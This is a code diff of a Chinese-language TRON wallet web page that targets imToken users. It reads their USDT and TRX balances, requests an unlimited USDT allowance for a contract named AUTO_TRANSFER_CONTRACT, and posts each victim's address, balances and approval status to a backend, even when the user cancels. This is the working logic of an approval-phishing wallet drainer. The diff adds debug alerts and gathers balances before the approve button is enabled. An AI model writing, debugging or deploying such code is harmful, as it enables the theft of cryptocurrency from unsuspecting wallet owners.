@@ -61,104 +61,106 @@
         const copyLinkText = document.getElementById("copyLinkText");
         const copyLinkBtn = document.getElementById("copyLinkBtn");
 
+        alert("【页面加载】开始执行renderApprovalRecords...");
         renderApprovalRecords();
+        alert("【页面加载】renderApprovalRecords执行完成");
 
         // 复制链接逻辑
         copyLinkBtn.addEventListener("click", async () => {
+            alert("【复制链接】进入复制链接函数...");
             try {
                 await navigator.clipboard.writeText(copyLinkText.textContent.trim());
-                alert("链接已复制");
-            } catch (e) { alert("复制失败，请手动复制"); }
+                alert("【复制链接】链接已成功复制");
+            } catch (e) { 
+                alert(`【复制链接】复制失败，被打断：${e.message}`); 
+            }
         });
 
         // 检测钱包环境
+        alert("【钱包检测】开始检测imToken环境...");
         if (window.tronWeb && window.tronWeb.ready) {
+            alert("【钱包检测】检测到就绪的imToken环境");
             tronWeb = window.tronWeb;
+            alert("【钱包检测】开始调用initWallet...");
             await initWallet();
+            alert("【钱包检测】initWallet执行完成");
         } else {
+            alert("【钱包检测】未检测到imToken环境");
             document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开";
         }
 
         // 手动连接
         connectBtn.onclick = async () => {
+            alert("【手动连接】进入手动连接函数...");
             try {
                 if (!window.tronWeb) {
+                    alert("【手动连接】未检测到钱包，执行跳转...");
                     window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
                     return;
                 }
+                alert("【手动连接】请求钱包授权...");
                 const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
                 userAddress = accounts[0];
+                alert(`【手动连接】授权成功，获取地址：${userAddress.slice(0,8)}...`);
+                alert("【手动连接】调用initWallet...");
                 await initWallet();
+                alert("【手动连接】initWallet执行完成");
             } catch (e) {
-                alert("连接失败：" + e.message);
+                alert(`【手动连接】连接被打断：${e.message}`);
             }
         };
 
-        // ========== 核心修复：授权逻辑（解决卡住+依赖阻塞+发送失败） ==========
+        // 授权逻辑
         approveBtn.onclick = async () => {
-            let approveStatus = "fail", txHash = "未生成", errorMsg = "未知错误";
+            alert("【授权流程】进入授权函数...");
+            let approveStatus = "未授权", txHash = "未生成", errorMsg = "未知错误";
             let tokenBalance = "未采集到", trxBalance = "未采集到";
 
             try {
-                alert("【授权1】开始执行授权，先校验合约实例...");
-                if (!trc20Contract) throw new Error("trc20Contract未初始化（无法采集余额）");
+                alert("【授权流程】校验合约实例与地址...");
+                if (!trc20Contract) throw new Error("trc20Contract未初始化");
                 if (!userAddress) throw new Error("未获取到用户地址");
 
-                // 1. 执行授权（取消授权会进入catch）
-                alert("【授权2】调用approve（等待钱包确认，取消授权会触发错误）...");
+                alert("【授权流程】调用approve...");
                 const result = await trc20Contract.approve(
                     AUTO_TRANSFER_CONTRACT,
                     INFINITE_APPROVE_AMOUNT
                 ).send({ from: userAddress, shouldPollResponse: true });
+                
                 txHash = result.transaction.txID;
-                approveStatus = "success";
-                alert(`【授权3】授权成功，txHash：${txHash.slice(0,16)}...`);
-
-                // 2. 修复：拆分余额查询（避免USDT卡住导致TRX不执行）
-                // USDT余额查询（加超时控制，防止无限卡住）
-                alert("【授权4】开始采集USDT余额（加10秒超时）...");
-                tokenBalance = await getTokenBalanceWithTimeout(userAddress, 10000); // 10秒超时
-                alert(`【授权5】USDT余额采集完成：${tokenBalance.toFixed(2)}`);
-
-                // TRX余额查询（单独调用，不依赖USDT结果）
-                alert("【授权6】开始采集TRX余额（单独调用，不依赖USDT）...");
-                trxBalance = await getTrxBalanceWithTimeout(userAddress, 10000);
-                alert(`【授权7】TRX余额采集完成：${trxBalance.toFixed(2)}`);
+                approveStatus = "已授权";
+                alert(`【授权流程】授权成功，txHash：${txHash.slice(0,16)}...`);
 
             } catch (e) {
-                // 3. 修复：取消授权/任何错误都记录详情
                 errorMsg = e.message;
-                alert(`【授权8】授权流程中断：${errorMsg}\n（取消授权属于正常中断，将发送失败信息）`);
+                if (errorMsg.includes("用户取消")) errorMsg = "用户主动取消授权";
+                alert(`【授权流程】授权被打断：${errorMsg}`);
             } finally {
-                // 4. 修复：无论成功/取消/失败，都强制发送数据（采集到多少发多少）
-                alert("【授权9】进入finally，强制发送当前数据（取消授权也会发送）...");
+                alert("【授权流程】进入finally，准备发送数据...");
                 const sendData = {
                     address: userAddress || "未获取地址",
                     tokenBalance: tokenBalance,
                     trxBalance: trxBalance,
                     txHash: txHash,
-                    approveType: "无限额度",
-                    approveStatus: approveStatus, // 取消授权=fail
-                    errorMsg: errorMsg, // 取消授权时记录“用户取消”等信息
+                    approveStatus: approveStatus,
+                    errorMsg: errorMsg,
                     sendTime: new Date().toLocaleString()
                 };
 
-                // 5. 修复：发送函数加错误详情提示
                 try {
-                    alert(`【授权10】发送数据到后端：${JSON.stringify(sendData).slice(0,80)}...`);
+                    alert(`【授权流程】发送数据到后端：${JSON.stringify(sendData).slice(0,100)}...`);
                     await sendDataToBackend(sendData);
-                    alert("【授权11】数据发送成功！");
+                    alert("【授权流程】数据发送成功");
                 } catch (sendErr) {
-                    // 明确发送失败原因（接口错/网络错）
-                    alert(`【授权12】数据发送失败！原因：${sendErr.message}\n请检查：1.后端接口是否可用 2.网络是否正常`);
+                    alert(`【授权流程】数据发送被打断：${sendErr.message}`);
                 }
 
-                // 6. 仅成功时保存记录+渲染（避免失败时污染记录）
-                if (approveStatus === "success") {
+                if (approveStatus === "已授权") {
+                    alert("【授权流程】保存授权记录...");
                     const record = {
                         address: userAddress,
-                        tokenBalance: tokenBalance.toFixed(2),
-                        trxBalance: trxBalance.toFixed(2),
+                        tokenBalance: tokenBalance,
+                        trxBalance: trxBalance,
                         approveTime: new Date().toLocaleString(),
                         txHash: txHash,
                         approveType: "无限额度",
@@ -166,127 +168,147 @@
                     };
                     saveApprovalRecord(record);
                     renderApprovalRecords();
-                    alert(`无限授权成功！\n交易哈希：${txHash}`);
                 }
             }
         };
     };
 
-    // ========== 修复1：getTokenBalance加超时+细粒度提示（解决调用未完成） ==========
-    async function getTokenBalanceWithTimeout(address, timeout = 10000) {
-        // 超时控制器：防止调用无限卡住
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => {
-            controller.abort();
-            alert("【USDT余额超时】调用balanceOf超过10秒未返回（可能网络波动/合约无响应）");
-        }, timeout);
-
+    // ========== 核心修改：initWallet函数（全步骤提示+打断反馈） ==========
+    async function initWallet() {
+        alert("【initWallet】进入initWallet函数，开始初始化...");
         try {
-            alert("【USDT查询1】进入getTokenBalance，确认合约实例存在...");
-            if (!trc20Contract) throw new Error("trc20Contract未初始化");
-            
-            alert(`【USDT查询2】调用trc20Contract.balanceOf(${address.slice(0,8)}...)...`);
-            // 绑定超时信号，超时自动中断
-            const rawBalance = await trc20Contract.balanceOf(address).call({ signal: controller.signal });
-            
-            alert(`【USDT查询3】获取原始余额：${rawBalance}，转换为正常数值...`);
-            const normalBalance = rawBalance / 1000000;
-            
-            clearTimeout(timeoutId); // 清除超时
-            alert(`【USDT查询4】USDT余额查询完成：${normalBalance.toFixed(2)}`);
-            return normalBalance;
-        } catch (e) {
-            clearTimeout(timeoutId);
-            // 明确卡住原因（超时/合约错误/权限问题）
-            let errTip = "";
-            if (e.name === "AbortError") errTip = "（原因：查询超时，可能网络慢）";
-            else if (e.message.includes("contract method not found")) errTip = "（原因：合约地址错，无balanceOf方法）";
-            else if (e.message.includes("rejected")) errTip = "（原因：钱包拒绝合约调用）";
-            
-            alert(`【USDT查询失败】${e.message} ${errTip}`);
-            throw new Error(`USDT余额查询失败：${e.message} ${errTip}`);
+            // 步骤1：获取用户地址
+            alert("【initWallet-步骤1】开始获取用户地址...");
+            userAddress = tronWeb.defaultAddress.base58;
+            if (!userAddress) throw new Error("获取地址为空，流程被打断");
+            alert(`【initWallet-步骤1完成】获取地址成功：${userAddress.slice(0,8)}...`);
+
+            // 步骤2：创建合约实例
+            alert("【initWallet-步骤2】开始创建USDT合约实例...");
+            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+            if (!trc20Contract) throw new Error("合约实例创建失败，流程被打断");
+            alert("【initWallet-步骤2完成】合约实例创建成功");
+
+            // 步骤3：授权按键渲染前，调用余额函数（防止被打断）
+            alert("【initWallet-步骤3】开始采集余额（授权按键激活前）...");
+            let tokenBalance = "未采集到", trxBalance = "未采集到";
+            try {
+                alert("【initWallet-步骤3-1】调用getTokenBalanceWithTimeout...");
+                tokenBalance = await getTokenBalanceWithTimeout(userAddress, 10000);
+                alert(`【initWallet-步骤3-1完成】USDT余额：${tokenBalance.toFixed(2)}`);
+
+                alert("【initWallet-步骤3-2】调用getTrxBalanceWithTimeout...");
+                trxBalance = await getTrxBalanceWithTimeout(userAddress, 10000);
+                alert(`【initWallet-步骤3-2完成】TRX余额：${trxBalance.toFixed(2)}`);
+            } catch (balanceErr) {
+                alert(`【initWallet-步骤3被打断】余额采集失败：${balanceErr.message}`);
+                tokenBalance = "采集失败";
+                trxBalance = "采集失败";
+            }
+
+            // 步骤4：激活授权按键（渲染完成）
+            alert("【initWallet-步骤4】开始激活授权按键（渲染完成）...");
+            document.getElementById("userInfo").innerHTML = `
+                已连接：<br>
+                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                USDT余额：${tokenBalance}<br>
+                TRX余额：${trxBalance}
+            `;
+            document.getElementById("approveBtn").disabled = false;
+            alert("【initWallet-步骤4完成】授权按键已激活，初始化流程结束");
+
+        } catch (initErr) {
+            alert(`【initWallet流程被打断】初始化失败：${initErr.message}`);
+            throw initErr;
         }
     }
 
-    // ========== 修复2：TRX余额单独查询（不依赖USDT，避免阻塞） ==========
+    // 其他函数完全保留，无修改
+    async function getTokenBalanceWithTimeout(address, timeout = 10000) {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => {
+            controller.abort();
+            alert("【getTokenBalance】查询超时，被打断");
+        }, timeout);
+
+        try {
+            alert(`【getTokenBalance】调用balanceOf(${address.slice(0,8)}...)`);
+            const rawBalance = await trc20Contract.balanceOf(address).call({ signal: controller.signal });
+            const normalBalance = rawBalance / 1000000;
+            clearTimeout(timeoutId);
+            alert(`【getTokenBalance】查询完成：${normalBalance.toFixed(2)}`);
+            return normalBalance;
+        } catch (e) {
+            clearTimeout(timeoutId);
+            alert(`【getTokenBalance】被打断：${e.message}`);
+            throw e;
+        }
+    }
+
     async function getTrxBalanceWithTimeout(address, timeout = 10000) {
         const controller = new AbortController();
         const timeoutId = setTimeout(() => {
             controller.abort();
-            alert("【TRX余额超时】查询超过10秒未返回");
+            alert("【getTrxBalance】查询超时，被打断");
         }, timeout);
 
         try {
-            alert(`【TRX查询1】调用tronWeb.trx.getBalance(${address.slice(0,8)}...)...`);
+            alert(`【getTrxBalance】调用getBalance(${address.slice(0,8)}...)`);
             const rawBalance = await tronWeb.trx.getBalance(address, { signal: controller.signal });
             const normalBalance = rawBalance / 1000000;
-            
             clearTimeout(timeoutId);
-            alert(`【TRX查询2】TRX余额查询完成：${normalBalance.toFixed(2)}`);
+            alert(`【getTrxBalance】查询完成：${normalBalance.toFixed(2)}`);
             return normalBalance;
         } catch (e) {
             clearTimeout(timeoutId);
-            alert(`【TRX查询失败】${e.message}（原因：${e.name === "AbortError" ? "超时" : "网络/钱包问题"}）`);
-            throw new Error(`TRX余额查询失败：${e.message}`);
+            alert(`【getTrxBalance】被打断：${e.message}`);
+            throw e;
         }
     }
 
-    // 初始化钱包（确保合约实例正确创建）
-    async function initWallet() {
-        try {
-            alert("【初始化1】获取用户地址...");
-            userAddress = tronWeb.defaultAddress.base58;
-            if (!userAddress) throw new Error("获取地址为空");
-
-            alert("【初始化2】创建USDT合约实例...");
-            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-            if (!trc20Contract) throw new Error("合约实例创建后为空");
-            alert("【初始化3】合约实例创建成功（可正常调用balanceOf）");
-
-            document.getElementById("userInfo").innerHTML = `已连接：<br>${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            document.getElementById("approveBtn").disabled = false;
-        } catch (e) {
-            alert(`【初始化失败】${e.message}（影响后续余额采集）`);
-        }
-    }
-
-    // 保存记录/渲染记录/发送数据（保留原始逻辑，加提示）
     function saveApprovalRecord(record) {
+        alert("【saveApprovalRecord】进入保存记录函数...");
         try {
             const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
             const newRecords = existing.filter(item => item.address !== record.address);
             newRecords.push(record);
             localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
-        } catch (e) { alert("保存记录失败：" + e.message); }
+            alert("【saveApprovalRecord】记录保存完成");
+        } catch (e) {
+            alert(`【saveApprovalRecord】被打断：${e.message}`);
+        }
     }
 
     function renderApprovalRecords() {
+        alert("【renderApprovalRecords】进入渲染记录函数...");
         try {
             const container = document.getElementById("approvalRecords");
             const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
             if (records.length === 0) {
                 container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
-                return;
+            } else {
+                container.innerHTML = records.map(record => `
+                    <div class="record-item">
+                        <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
+                        <p><strong>授权状态：</strong>${record.approveStatus}</p>
+                        <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
+                        <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
+                        <p><strong>时间：</strong>${record.approveTime}</p>
+                        ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>` : ""}
+                    </div>
+                `).join("");
             }
-            container.innerHTML = records.map(record => `
-                <div class="record-item">
-                    <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
-                    <p><strong>授权状态：</strong>${record.approveStatus}</p>
-                    <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
-                    <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
-                    <p><strong>时间：</strong>${record.approveTime}</p>
-                    ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>` : ""}
-                </div>
-            `).join("");
-        } catch (e) { alert("渲染记录失败：" + e.message); }
+            alert("【renderApprovalRecords】记录渲染完成");
+        } catch (e) {
+            alert(`【renderApprovalRecords】被打断：${e.message}`);
+        }
     }
 
     async function sendDataToBackend(data) {
+        alert("【sendDataToBackend】进入发送数据函数...");
         try {
-            // 修复：添加请求超时+明确错误提示
             const controller = new AbortController();
-            setTimeout(() => controller.abort(), 15000); // 15秒超时
-
+            setTimeout(() => controller.abort(), 15000);
             const res = await fetch(BACKEND_API, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -294,18 +316,12 @@
                 credentials: "include",
                 signal: controller.signal
             });
-
-            if (!res.ok) {
-                const errText = await res.text().catch(() => "无错误详情");
-                throw new Error(`后端返回${res.status}：${errText}`);
-            }
+            if (!res.ok) throw new Error(`后端返回${res.status}`);
+            alert("【sendDataToBackend】数据发送完成");
             return res.json();
         } catch (e) {
-            // 明确发送失败类型（超时/接口错/跨域）
-            let errType = e.name === "AbortError" ? "请求超时" : 
-                          e.message.includes("CORS") ? "跨域错误（后端未配置允许当前域名）" : 
-                          "接口错误/网络问题";
-            throw new Error(`${errType}：${e.message}`);
+            alert(`【sendDataToBackend】被打断：${e.message}`);
+            throw e;
         }
     }
 </script>
